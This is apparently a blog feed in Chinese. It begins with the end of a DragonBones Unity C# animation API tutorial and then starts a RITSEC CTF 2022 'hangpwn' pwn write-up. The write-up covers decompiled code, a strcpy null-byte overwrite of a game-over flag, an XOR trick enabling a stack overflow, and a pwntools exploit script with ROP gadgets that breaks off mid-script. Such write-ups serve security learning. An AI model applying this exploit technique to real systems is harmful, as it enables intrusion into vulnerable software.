-1)</span><br></pre></td></tr></table></figure><p>播放指定动画，并设置循环次数。</p><p>参数:</p><p><code>animationName</code>:运行动画名称。</p><p><code>playTimes</code>:循环次数  [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br></pre></td></tr></table></figure><h3 id="淡入播放指定的动画"><a href="#淡入播放指定的动画" class="headerlink" title="淡入播放指定的动画"></a>淡入播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState FadeIn(string animationName, float fadeInTime &#x3D; -1.0f, int playTimes &#x3D; -1,</span><br><span class="line">                                  int layer &#x3D; 0, string group &#x3D; null,</span><br><span class="line">                                  AnimationFadeOutMode fadeOutMode &#x3D; AnimationFadeOutMode.SameLayerAndGroup)</span><br></pre></td></tr></table></figure><p><code>FadeIn()</code>淡入播放指定的动画。</p><p>参数：</p><p><code>animationName</code>：动画数据名称。</p><p> <code>fadeInTime</code>:淡入时间。 [-1: 使用动画数据默认值, [0~N]: 淡入时间 (以秒为单位)] （默认: -1）</p><p><code>playTimes</code>: 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p><code>layer</code>:混合图层，图层高的动画状态会优先获取混合权重，当混合权重分配总和超过 1.0 时，剩余的动画状态将不能再获得权重分配。 （默认: 0）</p><p><code>group</code> 混合组名称，该属性通常用来指定多个动画状态混合时的相互替换关系。 （默认: null）</p><p><code>fadeOutMode</code>:淡出模式，该属性通常用来指定多个动画状态混合时的相互替换模式。 （默认: <code>AnimationFadeOutMode.SameLayerAndGroup</code>）</p><p>返回值：</p><p>播放的状态。</p><p>PS:淡出模式的具体模式有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnimationFadeOutMode.None &#x2F;&#x2F;不淡出任何的动画状态，值同等于0   </span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameLayer &#x2F;&#x2F;淡出同层的动画状态，值同等于1</span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameGroup&#x2F;&#x2F; 淡出同组的动画状态，值同等于2</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.SameLayerAndGroup &#x2F;&#x2F;淡出同层并且同组的动画状态，值同等于3</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.ALL&#x2F;&#x2F;淡出所有的动画状态，值同等于4</span><br><span class="line"></span><br><span class="line">AnimationFadeOutMode.Single &#x2F;&#x2F; 不替换同名的动画状态，值同等于5</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.fadeIn(&quot;walk&quot;, 0.3, 0, 0, &quot;normalGroup&quot;).resetToPose &#x3D; false;</span><br><span class="line">armature.animation.fadeIn(&quot;attack&quot;, 0.3, 1, 0, &quot;attackGroup&quot;).resetToPose &#x3D; false;</span><br></pre></td></tr></table></figure><h3 id="指定时间开始播放指定动画"><a href="#指定时间开始播放指定动画" class="headerlink" title="指定时间开始播放指定动画"></a>指定时间开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByTime(string animationName, float time &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByTime()</code>-指定时间开始播放.</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p>  <code>time</code>- 播放开始的时间。 (以秒为单位)</p><p><code>playTimes</code>- 循环播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定帧开始播放指定动画"><a href="#指定帧开始播放指定动画" class="headerlink" title="指定帧开始播放指定动画"></a>指定帧开始播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByFrame(string animationName, uint frame &#x3D; 0, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByFrame</code>从指定帧开始播放指定的动画</p><p>参数:</p><p><code>animationName</code>- 动画数据名称。</p><p><code>frame</code>- 播放开始的帧数。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>播放的动画状态。</p><h3 id="指定进度开始播放指定的动画"><a href="#指定进度开始播放指定的动画" class="headerlink" title="指定进度开始播放指定的动画"></a>指定进度开始播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndPlayByProgress(string animationName, float progress &#x3D; 0.0f, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p><code>GotoAndPlayByProgress</code>指定进度开始播放指定的动画。</p><p>参数：</p><p><code>animationName</code> 动画数据名称。</p><p><code>progress</code>- 开始播放的进度。</p><p><code>playTimes</code>- 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p>返回值：</p><p>returns-播放的动画状态。</p><h3 id="指定时间停止指定动画播放"><a href="#指定时间停止指定动画播放" class="headerlink" title="指定时间停止指定动画播放"></a>指定时间停止指定动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByTime(string animationName, float time &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>在指定时间停止指定动画播放。</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>time</code>- 停止的时间。 (以秒为单位)</p><p>返回值：播放的动画状态。</p><h3 id="指定帧停止指定动画的播放"><a href="#指定帧停止指定动画的播放" class="headerlink" title="指定帧停止指定动画的播放"></a>指定帧停止指定动画的播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByFrame(string animationName, uint frame &#x3D; 0)</span><br></pre></td></tr></table></figure><p>在指定帧停止指定动画的播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称.</p><p><code>frame</code>- 停止的帧数。</p><p> 返回值：</p><p>播放的动画状态。</p><h3 id="指定的进度停止指定的动画播放"><a href="#指定的进度停止指定的动画播放" class="headerlink" title="指定的进度停止指定的动画播放"></a>指定的进度停止指定的动画播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GotoAndStopByProgress(string animationName, float progress &#x3D; 0.0f)</span><br></pre></td></tr></table></figure><p>指定的进度停止指定的动画播放</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><p><code>progress</code>- 停止进度。</p><p>返回状态：播放的动画状态。</p><h3 id="获取指定的动画状态"><a href="#获取指定的动画状态" class="headerlink" title="获取指定的动画状态"></a>获取指定的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState GetState(string animationName)</span><br></pre></td></tr></table></figure><p>获取指定的动画状态</p><p>参数：</p><p><code>animationName</code>- 动画状态名称。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br><span class="line">et walkState &#x3D; armature.animation.getState(&quot;walk&quot;);</span><br><span class="line">walkState.timeScale &#x3D; 0.5;</span><br></pre></td></tr></table></figure><h3 id="检查是否包含指定的动画数据"><a href="#检查是否包含指定的动画数据" class="headerlink" title="检查是否包含指定的动画数据"></a>检查是否包含指定的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public bool HasAnimation(string animationName)</span><br><span class="line">        &#123;</span><br><span class="line">            return this._animations.ContainsKey(animationName);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>HasAnimation()</code>检查是否包含指定的动画数据</p><p>参数：</p><p><code>animationName</code>- 动画数据名称。</p><h3 id="获取所有的动画状态"><a href="#获取所有的动画状态" class="headerlink" title="获取所有的动画状态"></a>获取所有的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;AnimationState&gt; GetStates()</span><br></pre></td></tr></table></figure><p><code>GetStates()</code> 获取所有的动画状态.</p><h3 id="检查是否有动画状态正在播放"><a href="#检查是否有动画状态正在播放" class="headerlink" title="检查是否有动画状态正在播放"></a>检查是否有动画状态正在播放</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isPlaying</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isPlaying</span><br></pre></td></tr></table></figure><p>为True  表在播放，为flase则未在播放。</p><h3 id="检查是否所有的动画状态均已播放完毕"><a href="#检查是否所有的动画状态均已播放完毕" class="headerlink" title="检查是否所有的动画状态均已播放完毕"></a>检查是否所有的动画状态均已播放完毕</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public bool isCompleted</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态名称"><a href="#上一个播放的动画状态名称" class="headerlink" title="上一个播放的动画状态名称"></a>上一个播放的动画状态名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public string lastAnimationName</span><br><span class="line">&#x2F;&#x2F; 示例：</span><br><span class="line">armature.animation.isCompleted</span><br></pre></td></tr></table></figure><h3 id="所有动画数据的名称"><a href="#所有动画数据的名称" class="headerlink" title="所有动画数据的名称"></a>所有动画数据的名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;string&gt; animationNames</span><br></pre></td></tr></table></figure><h3 id="所有的动画数据"><a href="#所有的动画数据" class="headerlink" title="所有的动画数据"></a>所有的动画数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public Dictionary&lt;string, AnimationData&gt; animations</span><br></pre></td></tr></table></figure><p>一个可以快速使用的动画配置实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationConfig animationConfig</span><br></pre></td></tr></table></figure><h3 id="上一个播放的动画状态"><a href="#上一个播放的动画状态" class="headerlink" title="上一个播放的动画状态"></a>上一个播放的动画状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState lastAnimationState</span><br></pre></td></tr></table></figure><h2 id="替换骨骼动画"><a href="#替换骨骼动画" class="headerlink" title="替换骨骼动画"></a>替换骨骼动画</h2><p>Assets\DragonBones\Editor\UnityEditor.cs  里用执行替换骨骼动画的函数–<code>ChangeDragonBonesData</code></p><p>拷贝<code>Assets\DragonBones\Editor\UnityEditor.cs</code>到目录<code>Assets\DragonBones\Scripts\animation\</code></p><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static bool ChangeDragonBonesData(UnityArmatureComponent _armatureComponent, TextAsset dragonBoneJSON)</span><br></pre></td></tr></table></figure><p><code>ChangeDragonBonesData</code>的一个参数时要替换骨骼与动画<code>UnityArmatureComponent</code>控件，二个是替换成的dragonBoneJSON数据。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var anmi2&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br><span class="line">UnityDragonBonesData SSS;</span><br><span class="line">UnityFactory.factory.Clear(true); &#x2F;&#x2F;清楚缓存</span><br><span class="line">SSS&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;kwww&#x2F;ssss_Data.asset&quot;);</span><br><span class="line">DragonBones.UnityEditor.ChangeDragonBonesData(anmi2,SSS.dragonBonesJSON);</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/README-zh_CN.md</a></p><p><a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/README-zh_CN.md</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> unity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DragonBones </tag>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC-CTF-2022-PWN-hangpwn</title>
      <link href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/"/>
      <url>/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/</url>
      
        <content type="html"><![CDATA[<p>这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题<a id="more"></a>。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>题目没有开启PIE和canary。减少了不小负担。</p><p>题目的主要功能很简单就是猜测字符，主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> guessed[<span class="number">7</span>]; <span class="comment">// [rsp+1h] [rbp-3Fh]</span></span><br><span class="line">  <span class="keyword">char</span> guess_buffer[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">16</span>]; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  game_0 state; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v10 = v3;</span><br><span class="line">  init_game();</span><br><span class="line">  *(_QWORD *)&amp;state.attempts = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)&amp;state.words[<span class="number">6</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)<span class="built_in">buffer</span> = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;<span class="built_in">buffer</span>[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)guess_buffer = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)&amp;guess_buffer[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)guessed = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;guessed[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  guessed[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !state.game_over &amp;&amp; !state.solved )</span><br><span class="line">  &#123;</span><br><span class="line">    print_game(&amp;state);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter letter: "</span>);</span><br><span class="line">    v4 = fgets(<span class="built_in">buffer</span>, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">    *((_BYTE *)&amp;v10 + <span class="built_in">strcspn</span>(<span class="built_in">buffer</span>, <span class="string">"\n"</span>) - <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(<span class="built_in">buffer</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      char_comp(<span class="built_in">buffer</span>, <span class="string">"v&#125;zsuag"</span>, guessed, state.attempts, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( state.attempts == <span class="number">6</span> )</span><br><span class="line">        state.game_over = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"FINAL GUESS\nEnter word: "</span>, <span class="string">"v&#125;zsuag"</span>);</span><br><span class="line">      v4 = fgets(guess_buffer, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">      <span class="keyword">if</span> ( compare_enc(guess_buffer, <span class="string">"v&#125;zsuag"</span>, <span class="number">7</span>) )</span><br><span class="line">        state.solved = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br><span class="line">      enc(state.words[state.attempts], <span class="number">1</span>);</span><br><span class="line">      ++state.attempts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"\n\tINVALID INPUT"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  print_game(&amp;state);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个功能有点沉于，首先这个猜测在一个循环里进行。但是这个循环由两参数控制<code>game_over</code>和<code>solved</code>控制，其中一个为真则循环结束。</p><p>而这个猜测有两个阶段：</p><p>第一个阶段要求输入这个字符，如何这个字符在目的字符里则显现出来。若输入不是一个字符则重新进入第一阶段。</p><p>第二阶段是输入一个字符串与目的字符串比较，若比较成功则solved为真。若二阶段进行了6次则game_over为真。</p><p>但是在布局时奇怪：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)&amp;state.words</span><br><span class="line">*(_QWORD *)&amp;state.game_over</span><br></pre></td></tr></table></figure><p><code>state.words</code>与<code>state.game_over</code>两者相临，即state.word结束后的高地址就是<code>state.game_over</code>.这样我们就有机会覆盖<code>state.game_over</code>.</p><p>同时代码中用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(state.words[state.attempts], <span class="built_in">buffer</span>);</span><br></pre></td></tr></table></figure><p>来写入words。</p><p>而strcpy有个特性：</p><blockquote><p>strcpy，即string copy（字符串复制）的缩写。</p><p>strcpy是<a href="https://baike.baidu.com/item/C%2B%2B/99272" target="_blank" rel="noopener">C++</a>语言的一个标准函数 ，strcpy把含有<a href="https://baike.baidu.com/item/' target="_blank" rel="noopener"\0'/9931274">‘\0’</a>结束符的字符串复制到另一个<a href="https://baike.baidu.com/item/地址空间" target="_blank" rel="noopener">地址空间</a>，返回值的类型为char*。</p></blockquote><p>换句话说，strcpy会在一个字符串后自动添加上’\x00’.</p><p>这样我们就有机会覆盖<code>state.game_over</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这样算我们输入6次就可以覆盖<code>state.game_over</code>那么为什么我们正常运行时，很难发现这个问题？</p><p>因为我们在覆盖<code>state.game_over</code>后，程序开始了下一次循环，<code>strcpy(state.words[state.attempts], buffer);</code>将覆盖<code>state.game_over</code>为我们输入的字符。这样’\x00’就被覆盖掉。因此我们得将<code>state.game_over</code>为0进行保留。</p><p>但是若我们输入’\x00’，<code>strlen(buffer)</code>将判断失败，无法写入<code>state.words</code></p><p>.幸好，题目中留个异或：<code>env()</code>函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *words, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length; ++i )</span><br><span class="line">    words[i] ^= <span class="number">0x34</span>u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以输入‘\x34’字符来代替‘\x00’.从而无限制写入栈。</p><p>剩下就是简单栈溢出。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/04/3 10:13:59</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./hangpwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004016dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016de : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016df : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004011dd : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004016e1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004016dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">'BINGAUS'</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span 